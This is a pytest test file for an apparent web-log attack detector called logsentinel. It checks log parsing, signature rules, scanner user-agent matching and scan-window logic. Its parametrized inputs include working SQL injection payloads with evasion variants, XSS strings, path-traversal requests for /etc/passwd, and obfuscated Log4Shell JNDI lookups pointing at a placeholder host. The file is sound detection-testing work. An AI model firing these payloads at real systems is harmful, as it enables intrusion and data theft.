from datetime import timedelta
from pathlib import Path

import pytest

from logsentinel.cli import main
from logsentinel.detectors.web import WebConfig, detect, match_scanner, match_signatures
from logsentinel.models import Severity
from logsentinel.parsers.web import parse_line, parse_lines

SAMPLE = Path(__file__).parent.parent / "samples" / "access.log"


def test_parse_combined_line():
    ev = parse_line('203.0.113.50 - - [22/Nov/2026:15:02:11 +0000] "GET /admin?x=1 HTTP/1.1" 404 196 "-" "gobuster/3.6"')
    assert ev and ev.source_ip == "203.0.113.50"
    assert (ev.method, ev.path, ev.protocol, ev.status, ev.size) == ("GET", "/admin?x=1", "HTTP/1.1", 404, 196)
    assert ev.user_agent == "gobuster/3.6" and ev.referrer == ""
    assert ev.timestamp.utcoffset() == timedelta(0)


def test_parse_common_format_escaped_quotes_and_noise():
    # Common Log Format (no referrer / UA) and a size of "-".
    ev = parse_line('192.0.2.1 - bob [22/Nov/2026:15:00:00 +0100] "HEAD / HTTP/1.0" 304 -')
    assert ev and ev.size == 0 and ev.user_agent == ""
    # Apache escapes quotes inside fields as \".
    ev = parse_line('192.0.2.1 - - [22/Nov/2026:15:00:00 +0000] "GET /?q=\\"x\\" HTTP/1.1" 200 5 "-" "a \\"b\\""')
    assert ev and ev.path == '/?q=\\"x\\"' and ev.user_agent == 'a \\"b\\"'
    # Malformed request line is kept with the raw text as path.
    ev = parse_line('198.51.100.99 - - [22/Nov/2026:15:10:00 +0000] "\\x16\\x03\\x01" 400 157 "-" "-"')
    assert ev and ev.method == "" and ev.status == 400
    assert parse_line("not an access log line") is None


@pytest.mark.parametrize("path, rule", [
    ("/p.php?id=1%20UNION%20ALL%20SELECT%20NULL--", "LS-WEB-001"),
    ("/login?u=admin'%20OR%20'1'='1", "LS-WEB-001"),
    ("/p?id=1/**/UNION/**/SELECT/**/1", "LS-WEB-001"),          # comment-for-space evasion
    ("/item?id=5%2527%2520OR%25201%253D1--", "LS-WEB-001"),      # double URL encoding
    ("/p?id=1'%20AND%20SLEEP(5)--", "LS-WEB-001"),
    ("/p?id=1%0AUNION%0ASELECT%201", "LS-WEB-001"),            # newline instead of space
    ("/p?id=1/*!50000UNION*//*!50000SELECT*/1", "LS-WEB-001"),  # MySQL executable comments
    ("/p?id=1/*%0A*/UNION/*%0A*/SELECT/**/1", "LS-WEB-001"),    # newline inside a comment
    ("/login?user=admin'%23", "LS-WEB-001"),                   # admin'# auth bypass
    ("/s?q=%3Cscript%3Ealert(1)%3C/script%3E", "LS-WEB-002"),
    ("/s?q=<img src=x onerror=alert(1)>", "LS-WEB-002"),
    ("/r?next=javascript:alert(1)", "LS-WEB-002"),
    ("/view?page=../../../../etc/passwd", "LS-WEB-003"),
    ("/dl?f=..%5C..%5Cwindows%5Cwin.ini", "LS-WEB-003"),
    ("/index.php?page=php://filter/convert.base64-encode/resource=index", "LS-WEB-003"),
    ("/?x=%24%7Bjndi:ldap://198.51.100.250/a%7D", "LS-WEB-006"),
    ("/?x=${${::-j}${::-n}${::-d}${::-i}:rmi://198.51.100.250/a}", "LS-WEB-006"),  # lookup obfuscation
    ("/?x=${${env:NOPE:-j}ndi:${lower:L}dap://198.51.100.250/a}", "LS-WEB-006"),
])
def test_signatures_match_attacks(path, rule):
    assert rule in {s.rule_id for s, _ in match_signatures(path)}


def test_log4shell_in_headers():
    hits = match_signatures("/", user_agent="${${lower:j}ndi:ldap://198.51.100.250:1389/a}")
    assert [(s.rule_id, fld) for s, fld in hits] == [("LS-WEB-006", "user_agent")]
    # The other rules only look at the URL: an odd User-Agent must not trigger SQLi.
    assert match_signatures("/", user_agent="Mozilla/5.0 ' OR '1'='1") == []


@pytest.mark.parametrize("path", [
    "/search?q=select+your+plan",
    "/blog/union-station-or-airport",
    "/docs/../img/logo.png",                 # a single ../ is not flagged
    "/api/orders?sort=date&order=desc",
    "/search?q=O%27Reilly+books",
    "/p?q=color:%27%23fff%27",               # quote + '#' that is a CSS colour, not a comment
    "/greeting?tpl=Hello+${name}",           # a template placeholder, not a JNDI lookup
])
def test_signatures_ignore_benign_requests(path):
    assert match_signatures(path) == []


def test_scanner_user_agents():
    assert match_scanner("sqlmap/1.8.11#stable (https://sqlmap.org)") == "sqlmap"
    assert match_scanner("Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)") == "Nikto"
    assert match_scanner("Fuzz Faster U Fool v2.1.0") == "ffuf"
    assert match_scanner("Mozilla/5.0 (X11; Linux x86_64) Firefox/132.0") is None


def _alerts(cfg: WebConfig | None = None):
    with SAMPLE.open() as f:
        return {(a.rule_id, a.source_ip): a for a in detect(parse_lines(f), cfg)}


def test_sample_detections():
    a = _alerts()
    assert a[("LS-WEB-001", "203.0.113.77")].severity is Severity.HIGH      # sqlmap payloads
    assert ("LS-WEB-001", "192.0.2.10") in a and ("LS-WEB-002", "192.0.2.10") in a
    assert a[("LS-WEB-003", "192.0.2.99")].mitre_technique == "T1190"
    assert a[("LS-WEB-005", "203.0.113.50")].details["tool"] == "gobuster"
    log4 = a[("LS-WEB-006", "203.0.113.200")]
    assert log4.count == 2 and any("[user_agent: ${jndi:" in s for s in log4.details["samples"])


def test_directory_scan_with_spoofed_user_agent():
    # 203.0.113.120 uses a normal browser UA: only the behavioural rule catches it.
    a = _alerts()
    scan = a[("LS-WEB-004", "203.0.113.120")]
    assert scan.mitre_technique == "T1595.003" and scan.count == 24
    assert ("LS-WEB-005", "203.0.113.120") not in a


def test_no_alerts_for_legitimate_clients():
    assert not {ip for _, ip in _alerts()} & {"198.51.100.7", "198.51.100.20", "198.51.100.99"}


def test_scan_window_expiry():
    # The spoofed-UA scan is spread over ~46 s; a 10 s window never holds 20 distinct misses.
    a = _alerts(WebConfig(scan_window=timedelta(seconds=10)))
    assert ("LS-WEB-004", "203.0.113.120") not in a
    assert ("LS-WEB-004", "203.0.113.50") in a


def test_cli_web_json(capsys):
    assert main(["web", str(SAMPLE), "--json"]) == 1
    out = capsys.readouterr().out
    assert "LS-WEB-004" in out and "T1595.003" in out
